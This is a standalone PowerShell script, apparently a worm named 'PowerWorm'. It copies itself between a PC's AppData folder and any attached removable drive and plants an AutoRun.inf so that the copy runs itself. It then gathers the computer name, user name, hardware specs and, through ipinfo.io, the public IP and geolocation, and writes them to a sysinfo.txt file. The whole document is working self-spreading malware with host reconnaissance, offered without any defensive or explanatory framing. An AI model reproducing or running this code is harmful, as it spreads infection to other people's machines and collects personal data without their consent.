$ScriptFile = Split-Path -Leaf $PSCommandPath
$ScriptBytes = Get-Content -Encoding Byte -ReadCount 0 $PSCommandPath
$Path = $env:appdata
$SysInfo = Join-Path $Path "sysinfo.txt"

if ($PWD.Path -ne $Path) {
    Write-Host "Running on removable drive. Spreading to PC disk."
    $FilePath = Join-Path $Path $ScriptFile
    if (!(Test-Path $FilePath)) {
        $File = New-Item $FilePath -ItemType File
        Set-Content -Path $FilePath -Value $ScriptBytes -Encoding Byte
    }
    Set-Location $Path
} else {
    Write-Host "Running on PC disk. Spreading to removable drives."
}

$RemovableDrive = Get-WMIObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}
if ($RemovableDrive -ne $null) {
    $FilePath = Join-Path $RemovableDrive.DeviceID $ScriptFile
    if (!(Test-Path $FilePath)) {
        $File = New-Item $FilePath -ItemType File
        Set-Content -Path $FilePath -Value $ScriptBytes -Encoding Byte
        $AutoRunPath = Join-Path $RemovableDrive.DeviceID "AutoRun.inf"
        if (!(Test-Path $AutoRunPath)) {
			$AutoRunContent = "[AutoRun]`r`nopen=$ScriptFile"
			Set-Content -Path $AutoRunPath -Value $AutoRunContent -Encoding Default
			Write-Host "AutoRun Exploit created on removable drive."
		}
        Write-Host "File '$ScriptFile' spread to drives: $($RemovableDrive.DeviceID)."
    }
} else {
    Write-Host "No removable drives found."
}

$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$os = Get-CimInstance Win32_OperatingSystem
$ram = [Math]::Round($os.TotalVisibleMemorySize/1MB)
$cpu = Get-CimInstance Win32_Processor | Select-Object Name,NumberOfCores
$gpu = Get-CimInstance Win32_VideoController | Select-Object Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" | Select-Object Size,FreeSpace
$ip = Invoke-RestMethod -Uri "http://ipinfo.io/json" | Select-Object ip, city, region, country, loc

# Create file and write system information to it
if (!(Test-Path $SysInfo)) {
    $File = New-Item $SysInfo -ItemType File
    $Content = "PowerWorm Recovered System Information:

Computer Name: $computerName
User Name: $userName
Operating System: $($os.Caption) $($os.Version) $($os.OSArchitecture)
-------------------------------------------------------------------------------------------------------
CPU: $($cpu.Name) ($($cpu.NumberOfCores) cores)
GPU: $($gpu.Name)
Disk Space: $([Math]::Round($disk.FreeSpace/1GB)) GB free of $([Math]::Round($disk.Size/1GB)) GB
RAM: $ram GB
-------------------------------------------------------------------------------------------------------
Local IP: $($ip.ip)
City Name: $($ip.city)
Region Name: $($ip.region)
Country Name: $($ip.country)
Co-ordinates: $($ip.loc)
-------------------------------------------------------------------------------------------------------
"
    Set-Content -Path $SysInfo -Value $Content -Encoding Default
}
